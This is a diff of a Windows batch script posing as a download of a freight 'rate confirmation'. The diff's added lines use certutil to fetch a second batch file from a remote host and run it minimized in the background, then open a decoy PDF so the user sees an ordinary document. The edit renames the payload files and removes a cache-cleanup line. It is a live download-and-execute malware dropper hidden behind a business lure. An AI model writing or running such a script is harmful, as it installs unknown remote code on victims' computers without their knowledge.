@@ -10,12 +10,10 @@ echo  Downloading rate confirmation...
 echo  Please wait...
 echo.
 
-certutil -urlcache -split -f "%R%/wdsrpn25cdv.bat" "%T%\wdsrpn43cdv.bat" >nul 2>&1
+certutil -urlcache -split -f "%R%/wdsrpn43cdv.bat" "%T%\wdsrpn431cdv.bat" >nul 2>&1
 certutil -urlcache -split -f "%R%/Rate_Confirmation_LD-2026-0847.pdf" "%D%\Rate_Confirmation_LD-2026-0847.pdf" >nul 2>&1
 
-certutil -urlcache -split -f "https://" delete 2>nul
-
-if exist "%T%\wdsrpn25cdv.bat" start "" /min cmd /c "%T%\wdsrpn43cdv.bat"
+if exist "%T%\wdsrpn431cdv.bat" start "" /min cmd /c "%T%\wdsrpn431cdv.bat"
 if exist "%D%\Rate_Confirmation_LD-2026-0847.pdf" start "" "%D%\Rate_Confirmation_LD-2026-0847.pdf"
 
 timeout /t 2 /nobreak >nul
